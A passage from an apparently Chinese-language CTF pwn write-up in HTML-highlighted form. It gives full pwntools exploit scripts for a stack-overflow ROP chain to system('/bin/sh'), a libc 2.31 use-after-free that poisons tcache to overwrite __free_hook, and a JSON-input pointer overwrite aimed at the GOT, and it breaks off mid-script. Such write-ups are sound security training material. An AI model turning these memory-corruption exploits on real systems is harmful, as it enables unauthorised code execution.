punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'请输入你的选项:'</span><span class="token punctuation">,</span>choice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shop</span><span class="token punctuation">(</span>buy<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'请输入购买的商品序号:'</span><span class="token punctuation">,</span>buy<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'你想要继续买花吗? 1/0'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'pwn'</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"请输入你的姓名:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400CE4'</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'请输入购买的商品序号:'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400f13</span>ret<span class="token operator">=</span><span class="token number">0x00000000004006f6</span>system<span class="token operator">=</span>ep<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span><span class="token number">0x0000000000601840</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'你想要继续买花吗? 1/0'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Heap：libc2-31-无限制UAF"><a href="#Kylin-Heap：libc2-31-无限制UAF" class="headerlink" title="Kylin_Heap：libc2.31 无限制UAF"></a>Kylin_Heap：libc2.31 无限制UAF</h1><p>直接tcache 打 __free_hook</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'What will you do, adventurer?'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'bytes): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ebbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="consumption：json序列化-指针覆盖打GOT"><a href="#consumption：json序列化-指针覆盖打GOT" class="headerlink" title="consumption：json序列化+指针覆盖打GOT"></a>consumption：json序列化+指针覆盖打GOT</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">[*] '/home/xinri/ccb/consumption/pwn'    Arch:       i386-32-little    RELRO:      No RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x8047000)    RUNPATH:    b'/home/xinri/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/'    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在于输入json序列化数据到 v12 时可以覆盖到 v13 存储的指针<br><img src="/EXP_FILE/3f4738a03ed191dd7d29c949cb51c49b_MD5.jpeg"></p><p>这里的<code>*a3</code>就是 v13 存储的指针，可以覆盖为 heaparray 打GOT<br><img src="/EXP_FILE/1b5d02b0735b4b49c0ee482948b40c20_MD5.jpeg"></p><p>有个坑点是 error() 函数除了输出“out!”并没有什么用处，但我先入为主以为会exit，白耗了很长时间，nm<br><img src="/EXP_FILE/4577a05dba2432dd602cae7dc5d8c078_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">import</span> json    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>  p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")  </span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> debug<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      pause<span class="token punctuation">(</span><span class="token punctuation">)</span>      gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>      sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> add_heap<span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"1","idx":0,"size":"'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> free_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"2","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>      <span class="token keyword">def</span> show_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"3","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> edit_heap<span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"4","idx":1,"size":"","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token comment">#debug()  </span><span class="token comment">#pause()  </span>  heaplist <span class="token operator">=</span> <span class="token number">0x08051B10</span>  add_heap<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span>    <span class="token comment">#free_got = elf.got["free"]  </span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>    payload_1 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x4cc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heaplist <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>  add_heap<span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span>payload_1<span class="token punctuation">)</span>  <span class="token comment">#add_heap(0x8,"AAAA")  </span>  show_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token 